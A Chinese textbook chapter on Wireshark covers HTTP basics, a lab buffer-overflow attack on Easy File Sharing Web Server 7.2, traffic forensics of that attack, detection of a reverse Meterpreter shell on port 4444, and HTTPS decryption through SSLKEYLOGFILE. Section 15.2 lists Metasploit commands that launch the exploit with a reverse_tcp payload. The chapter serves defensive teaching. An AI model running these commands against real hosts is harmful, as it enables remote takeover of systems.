前面介绍了很多种攻击方式，但它们都是基于网络协议的缺陷。而在实际情况中，除了这些内容之外，**操作系统和应用程序的漏洞也是网络安全研究的重点**。缓冲区溢出是现在很典型的一种远程攻击方式，**它利用了程序员在编写程序时的疏忽，从而实现了在远程设备上执行代码**。这些攻击方式**大都要通过应用层的协议实现**，所以会介绍应用层两个最为典型的协议HTTP协议和HTTPS协议。围绕以下内容展开介绍：
-缓冲区溢出攻击的相关理论；
-模拟缓冲区溢出攻击；
-使用Wireshark分析缓冲区溢出攻击；
-使用Wireshark检测远程控制；
-使用Wireshark分析HTTPs协议。
# 15.1缓冲区溢出攻击的相关理论
==缓冲区溢出是一种非常普遍、非常危险的漏洞==，在各种操作系统、应用软件中广泛存在。利用缓冲区溢出进行攻击，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，攻击者可以利用它执行非授权指令，甚至可以取得系统特权，进而执行各种操作。考虑到目前大量的应用程序都使用了B/S结构，而这种结构正是使用HTTP协议进行通信的，所以首先了解一下HTTP协议的相关知识。
### 15.1.1Wireshark观察下的HTTP协议
HTTP协议大概是与我们关系最为密切的应用层协议了。大多数人使用电脑的目的就是为了“上网”，而这个行为其实就是依靠HTTP协议才得以实现。简单来说，HTTP负责完成HTTP客户端与HTTP服务端的信息交流。例如当我们上淘宝购物的时候，淘宝网站就是HTTP服务端，而我们的设备就是HTTP客户端。
### 15.1.2HTTP的请求与应答
HTTP数据的传输过程也并不复杂，当我们在浏览器（例如火狐）的地址栏中输入了一个地址并按下回车键之后，浏览器会向目标服务器发送一个请求，当服务器收到这个请求之后，就会将一个网页回传给我们的浏览器。图15-1中给出了由Wireshark捕获到的请求和回应。
图1Wireshark捕获到的HTTP请求和回应
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307191333058.png)
这里面的请求和回应都是遵循HTTP协议的，浏览器发送和接送的内容如图2所示。
图2中给出的是将多个数据包组合之后的结果，这其实和我们平时所看到的内容相差不大了，上面方框的部分是请求，下面方框的部分是应答。
图2浏览器发送和接送的内容
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307191412890.png)

###15.1.3HTTP的常用方法
从Wireshark的角度来看其中的一个数据包，那么你看到的将会是如图15-3所示的形式。
图3Wireshark显示的HTTP数据包
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192329703.png)
HTTP协议的内容比较多，包括Requestmethod、host、User-agent等，这里面我们不一一介绍，只重点讲解其中比较常用的Requestmethod，这个字段常见的值有如下几个：
- GET请求获取由Request-URI所标识的资源；
- POST在Request-URI所标识的资源后附加新的数据；
- PUT请求服务器存储一个资源，并用Request-URI作为其标识；
- DELETE请求服务器删除由Request-URI所标识的资源。

例如我们上面例子中发出的请求就是使用的GET方法。
###15.1.4HTTP中常用的过滤器
如果需要在Wireshark中过滤掉除HTTP以外的数据包，可以使用下面的过滤器。
-捕获过滤器：porthttp。
-显示过滤器：http。

如果需要在Wireshark中根据方法来过滤数据包，可以使用如表15-1所示的过滤器。
表1HTTP常用的方法和对应的过滤器
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192330473.png)

这些过滤器在实际中很有用，例如当我们在监控网络中的流量时，查找包含敏感信息的数据包，如果一个表单中包含一些例如用户名、密码之类的信息，这些信息在提交的过程中，就会使用POST方式。所以在分析网络安全方面的时候，我们可以**检查在网络中传输的使用到POST方法的数据包，查看其中是否有敏感数据泄露**，使用的过滤器为：
```js
http.request.method=="POST"
```
例如，图4中就显示了捕获到数据包中的敏感信息。
图4筛选出包含敏感信息的数据包
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192331667.png)
 
## 15.2模拟缓冲区溢出攻击
在这个实验中，我们以一个在国外很流行的文件共享软件EasyFileSharingWebServer7.2作为实例，这个工具通过HTTP协议提供文件共享功能。**这里有漏洞的应用程序是简单文件分享Web服务器7.2（EasyFileSharingWebServer7.2）**，这个Web应用程序运行时的界面如图5所示。
图5简单文件分享Web服务器
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192332597.png)
在处理请求时存在的漏洞，==当接收到一个恶意的请求头部就可以引起缓冲区溢出，从而改写下一步要执行指令的地址==。图6给出了访问这个服务器的页面。
图6使用浏览器访问这个服务器的页面
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192332488.png)
好了，现在我们已经了解了在这次试验中使用的两个虚拟机：一个是KaliLinux2作为攻击发起端；另一个是Windows7，它上面运行着简单文件分享Web服务器7.2，IP地址为192.168.169.133。
图7筛选出包含敏感信息的数据包
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192333636.png)
那么我们现在就可以开始渗透测试了，首先启动KaliLinux2中的metasploit（见图8）。
图8Metasploit的启动界面
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192333554.png)
首先我们先用Search命令来查找和EasyFileSharing有关的模块，命令如下：
```js
msf>searchEasyFileSharing
```
在metasploit中查找了两个对应的模块，如图9所示。
图9查找到的EasyFileSharing渗透模块
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192334209.png)
这里我们使用exploit/windows/http/easyfilesharing_seh这个**模块**，这个漏洞是2015年
底发布的：
```js
msf>useexploit/windows/http/easyfilesharing_seh
```
启动了这个模块之后，我们可以使用“showoptions”来查看这个模块的选项，如图10所示。
图10使用“showoptions”来查看这个模块的选项
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192334130.png)
但需要注意的是，这里只列出了模块所需要的参数，其实我们如果想要利用这个模
块控制对方计算机的话，还需要**设置一个攻击载荷**，这里我们最为常用的是reverse_tcp：
```js
msfexploit(easyfilesharing_seh)>setpayloadwindows/meterpreter/reverse_tcp
msfexploit(easyfilesharing_seh)>setlhost192.168.169.130
msfexploit(easyfilesharing_seh)>setrhost192.168.169.131
msfexploit(easyfilesharing_seh)>setrport80
msfexploit(easyfilesharing_seh)>exploit
```
当这个模块执行之后，我们就会获得一个用来控制目标系统的session，如图11所示。
图11使用exploit命令进行渗透
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192334212.png)
从图11可以看到我们已经打开了一个session，也就是开启了对目标（192.168.169.131）的控制。而且我们现在获得了一个Meterpreter，利用它就可以完成对目标主机的远程控制。在这个过程中，我们使用Wireshark捕获了所有的通信流量，并将其保存为easyfilesharing_seh.pacap。
## 15.3 使用Wireshark分析缓冲区溢出攻击
在Wireshark中观察easyfilesharing_seh.pacap文件，**这个文件前面的数据包都是一些
ARP数据包，没有发现异常**。在第121个数据包时，192.168.32.129和192.168.32.132通过
TCP3次握手建立了连接。但接下来的4个HTTP数据包（见图15-12）却明显出现了异常，这明显是一个HTTP请求的分片，但是这个请求的长度显然太长了。
图15-12一个HTTP请求的分片
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192335863.png)
注意，这个数据包的数据部分在Wireshark中显示为“truncated”（见图13），意为“截断”。这很正常，因为它的长度为1332Bytes，这显然太长了，不可能放在同一行中。**在Wireshark的窗口中这种包含攻击载荷的数据包被显示错误是非常正常的**，因为攻击者恰恰就是利用构造一些畸形数据包来实现自己的目的。
图 13 数据包的数据部分在Wireshark中显示为【truncated】
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192336238.png)
正常提交的数据不会有这样的长度，**只有攻击者在试图进行缓冲区攻击时才会构造这种数据包**。

现在我们来考虑一个问题，为什么服务器在处理正常请求数据包和畸形请求数据包时会有不同的结果呢？这里我们假设这个服务器**有栈溢出漏洞的话**，那么当它收到请求数据包时，就会将数据包中的数据复制到缓冲区中，但却不对数据的长度进行检查。所以，==问题就出现了，当数据的长度大于缓冲区时，就会将多于缓冲区长度的数据复制到缓冲区外面==。

可是这个缓冲区的长度是多少呢？这个值很重要，==因为攻击者如果希望能够实现远程代码的执行，就得使用一些没有实际意义的数据来填充这个缓冲区==。我们有这样3个方法获得这个数字：
- 查询该漏洞的详细信息，以此来获得缓冲区的长度；
- 使用WinDBG和IDAPro对目标软件进行调试，计算出缓冲区的长度；
- 在Wireshark中分析**攻击载荷的内容**，计算出缓冲区的长度。

最简单的方法是第一种，不过作为一个网络取证分析者来看，使用Wireshark来分析是一个很好的锻炼。那么我们可以按照第3种方式来尝试一下，首先在这几个数据包上面单击鼠标右键，然后选择“Follow”|“HTTPStream”，得到如图14所示的数据流。
图14 在wireShark中看到的数据流
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192337680.png)

这里显示了完整的http请求，它是由几个部分所组成的，最开始的GET字符，然后是**导致缓冲区溢出的字符**（对于一个漏洞来说，这个值总是相同的），**再是要执行的代码部分**。从第2行开始起，一直到“..”之间的部分都是实现缓冲区溢出的字符，我们将其复制出来，在任意一个可以统计字数的工具里面查看其字符数。
图15-15统计的字符数
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192338889.png)

现在我们获得了以下的几个信息。
（1）这个数据包是以“GET”开始的。
（2）紧随在“GET”是4061个随机的大写字符。
（3）最后是以HTTP/1.0结束的。

根据这些信息，我们就可以将其添加到入侵检测系统的特征库中。**以后每当网络中出现这种类型的数据包时，就会引发入侵检测系统的报警了**。

有的读者可能注意到了另一个问题，我们这次是通过数据包的大小找到的攻击数据包。有没有其他方法可以更简单直接地找到它们呢？显示过滤器显然是一种不错的选择，另外要再介绍一下Wireshark中的数据包查找功能，使用方法是在工具栏中单击放大镜的图标，就可以启动这个功能的操作窗口（见图16）。
图16 Wireshark中的数据包查找功能
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192339182.png)
现在我们就可以在Wireshark的显示过滤器下方看到查找功能窗口了（见图17）。
图17 Wireshark中的查找功能窗口
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192339121.png)

这个查找功能中提供了4种选项，如图15-18所示，分别是：
- Displayfilter；
- Hexvalue；
- string；
- RegularExpression。

图18查找功能中提供了4种选项
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192340824.png)
其中的Displayfilter其实就是之前提到过的显示过滤，不过和之前不同的是，==当你在搜索框中设置了条件之后，Wireshark会逐条地将符合条件的数据包以反白的形式显示出来==，当你按下Find按钮就会跳到下一个符合结果的封包去。例如我们在搜索框中输入“http”，就可以找到第一个http协议数据包（见图19）。
图19 找到的第一个http协议数据包
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192341236.png)

第2种搜索的类型为Hexvalue，也就是十六进制值，例如我们在这里面查找包含“2f312e30”的数据包，就可以首先选中Hexvalue，在输入框中输入“2f312e30“，并按下Find，就可以逐项找到包含这个值的数据包。
图20 查找包含“2f312e30“的数据包
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192341404.png)

第3种搜索的类型为String，这是一个很有用的方法。我们可以在数据包中查找字符串。当我们在这里选择了String之后，会发现原本为灰色不能用的3个功能现在也可以使用了（见图21）。 
图21 可以使用的3个功能
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192341633.png)
这3个功能中的第一个是**指定搜索范围**，这里面包含Packetlist、Packet details及Packet bytes3个选项。选择不同的选项，Wireshark会在不同的位置进行搜索（见图22）。
图22 Wireshark的搜索位置
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192343109.png)
如图23所示，中间的部分用来指定编码方式，其中Narrow表示UTF-8或者ASCII，而Wide表示UTF16，Narrow&Wide表示兼容以上所有编码，最后面的Casesentive表示是否区分大小写。下面我们给出了搜索一个包含“GET”字段的数据包的过程。
图23 搜索到包含“GET”字段的数据包
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192346656.png)

最后一种类型为Regular Expression，这里可以使用正则表达式来查找符合条件的数据包。由于正则表达式比较复杂，暂不介绍相关内容。默认的搜索过程是向后的，我们可以使用组合键Ctrl+N和Ctrl+B实现向前或者向后查找。
 
## 15.4 使用Wireshark检测远程控制
192.168.32.132是一台Web服务器，正常情况下这台服务器应该只等待来自其他设备的TCP请求，然后建立连接。但是在第131、132、133位置的3个数据包却出现了一个奇怪的现象，IP地址为192.168.32.132的服务器竟然主动去连接另外一个计算机，并通过3次握手建立了连接（见图15-24）。==服务器的这个行为很反常，我们初步判断它已经感染了木马，而且是一个反向木马==。
图15-24服务器与外部建立的TCP连接
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192346753.png)
远程控制软件被控端与主控端的连接方式。按照不同的连接方式，我们可以将远程控制软件分为正向和反向两种。

这里我们假设这样一个场景，一个黑客设法在受害者的计算机上执行远程控制软件服务端，那么我们把黑客现在所使用的计算机称为Hacker，而把受害者所使用的计算机称为A。如果黑客所使用的远程控制软件是正向的，那么计算机A在执行了这个远程控制服务端之后，只会在自己的主机上打开一个端口，然后**等待Hacker计算机的连接**。注意，此时A计算机并不会去主动通知Hacker计算机（而反向控制软件会），因此==黑客必须知道计算机A的IP地址，这就导致正向控制在实际操作中具有很大的困难==。

而反向远程控制则截然不同，当计算机A在执行了这个远程控制被控端之后，会主动去通知Hacker计算机，“嗨，我现在受你的控制了，请下命令吧！”因此黑客也无需知道计算机A的IP地址。现在黑客所使用的**远程控制软件大都采用了反向控制**。

结合上一节的内容，我们猜测攻击者就是通过缓冲区溢出的攻击方式，将木马文件传送到服务器上并执行了。所以服务器才会在无人控制的情况下去反向连接192.168.32.129。**仅仅依靠TCP连接，攻击者还无法完全控制服务器**，我们继续浏览下面的数据包，目标主机产生了大量使用4444端口的数据包。这时攻击者在向服务器发送了很多数据，那么他是在做什么呢？我们可以在其中的一个数据包上单击右键，然后选择“Follow”→“TCPStream”。

如果你对PE文件格式有了解的话，看到“This program cannot be run in DOS mode”（见图25）就会知道这是一个PE文件的头部，PE文件的全称是Portable Executable，意为可移植的可执行的文件，==常见的微软Windows操作系统上的程序文件EXE、DLL、OCX、SYS、COM都是PE文件==。显然攻击者在建立了和服务器的连接之后，将一个可执行文件上传到了服务器中。这个文件体积要远远大于之前那个通过漏洞传递的木马文件，显然攻击者希望使用一个功能更为强大的工具。
图25 在数据流中发现的PR文件头部
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192350070.png)
现在我们已经了解了攻击者的思路了，这里该考虑一下安全措施了，因为攻击者通过4444端口在和服务器进行通信（见图26）。
图26 攻击者通过4444端口和服务器在进行通信
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192352230.png)
最简单的做法就是在防火墙上设置一个策略，**立刻在防火墙上对远程目的端口为4444的数据包进行丢弃**。这样一来，攻击者就无法收到来自服务器所发出的数据包了，自然也就无从谈起远程控制了。

Wireshark中还提供了一个十分方便的功能，就是可以**快速查询到防火墙的编写规则**。在菜单中依次选中“tools”→“Firewall ACLRules”，这里给出了一些常用的规则。

图27中方框中提供了多种常见防火墙设备，例如思科的ASA系列、Linux自带的iptables等。不过很可惜的是里面没有本书所使用的华为防火墙设备。这里以思科的ASA设备为例，它的规则分为两种standard和extended，其中的standard不能对端口进行过滤，所以我们需要选择CiscoIOS（extended）。
图27 Wireshark中提供的防火墙编写规则
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192353847.png)
如图15-28所示，在这里面很容易就找到了一个用来过滤4444端口流量的规则。但是要注意这并非长远之计，现在的黑客利用**端口映射技术**，可以将任意端口映射到4444端口上。也就是说木马控制服务器可能将数据包发送端口修改为8888，这样便通过了防火墙的检查。==但是当数据包到达控制者处，仍然可以映射到端口4444处==。因此，我们应该在网络中添加更完善的防御机制。
图28 找到的过滤4444端口流量的规则
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192353063.png)
## 15.5 Wireshark对HTTPS协议的解析
目前HTTP协议由于安全性方面的欠缺，**正在逐渐被更安全的HTTPS协议所取代**。HTTPS相对HTTP的优势主要在于所有通信的数据包都采用了加密技术，但是目前存在很多不同的加密方法，因此在进行分析时，要结合实际情况考虑。

例如当加密过程采用了RSA算法实现密钥交换时，==我们就可以通过将加密通话私钥加入到Wireshark中的方法来解析里面的内容==。但是目前有些使用的加密技术已经无法进行解密了，因为根本无法导出解密通话的秘钥。不过**黑客依然可以采用中间人欺骗的方法来截获网络通信的数据**。

下面我们先来介绍一下**导入加密通话私钥**的方法。
（1）在浏览网页时需要使用Firefox或者Chrome浏览器，其他的浏览器大都无法将用于通话加密的密钥保存成文件。
（2）修改计算机的环境变量配置，如果你使用的是Windows系统，可以在“我的电脑”上单击鼠标右键选中“属性”，然后在弹出的“控制面板主页”中选中“高级系统设置”→“高级”→“环境变量”（见图15-29）。
图29 修改计算机的环境变量配置
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192354537.png)
（3）如图30所示，在弹出的环境变量窗口中使用“新建”按钮添加一个新的用户变量。
图30 添加一个新的用户变量
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192357836.png)
（4）如图31所示，添加一个名为“SSLKEYLOGFILE”的新用户变量，然后在变量值处添加你用来存放这个变量的目录。
图31 添加一个名为“SSLKEYLOGFILE”的新用户变量
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192358181.png)
（5）这样**在Firefox中通话使用的密钥就会保存在这个文件中**。如果你使用的是Linux操作系统的话，可以使用如下语句：
```js
export SSLKEYLOGFILE=~/path/to/sslkeylog.log
```
（6）接下来，我们在Wireshark中导入密钥，在菜单栏上依次单击“编辑”→“首选项”，然后在打开的“首选项”窗口中选中“Protocols”（见图32）。
图32 在“首选项”窗口中选中“Protocols”
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307192358926.png)
（7）如图33所示，在“Protocols”中找到“SSL”，然后单击右侧的操作界面中（PRE）-Master-secret_log_filename中的Browse按钮，在弹出的资源管理器中选中我们之前设置好的环境变量。
图33 在SSL协议中添加秘钥
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307200000084.png)
（8）下面我们再来查看那些加密的流量，在数据包列表中选中加密的数据包，数据包信息面板的下方多了一个“DecryptedSSL”选项卡，这里就是解密之后的数据（见图34）。
图34 解密之后的“DecryptedSSL”选项卡
![](https://image-1307616428.cos.ap-beijing.myqcloud.com/Obsidian/202307200000029.png)

## 15.6 小结
开始介绍一种全新的攻击方式缓冲区溢出，它的攻击建立在应用层的协议上。所以本章在最开始先介绍了HTTP协议，然后模拟了一次缓冲区溢出的攻击过程。

重点在于使用Wireshark对这个攻击过程进行分析，在这个分析过程中还介绍了数据包的查找功能。在最后还介绍了如何使用Wireshark来分析http协议的升级版https协议。 